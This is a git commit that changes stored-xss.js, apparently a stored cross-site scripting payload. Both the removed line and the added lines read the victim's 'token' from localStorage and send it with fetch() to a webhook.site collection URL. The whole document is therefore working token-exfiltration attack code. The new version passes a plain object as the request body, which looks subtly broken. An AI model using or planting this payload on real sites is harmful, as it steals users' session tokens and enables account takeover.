23178da219078fd7e30dd9431b83bb72c153f87b
Lê Minh Quân <78531303+aleister1102@users.noreply.github.com>
2025-01-15 13:52:55 +0700

    Update stored-xss.js

--- stored-xss.js
+++ stored-xss.js
@@ -1,1 +1,5 @@
-fetch(`https://webhook.site/8ece4be5-0c5d-49d4-a663-5bf5ceef7057?${localStorage.getItem('token')}`)
+fetch(`https://webhook.site/8ece4be5-0c5d-49d4-a663-5bf5ceef7057`, {
+    body: {
+        token: localStorage.getItem('token')
+    }
+})
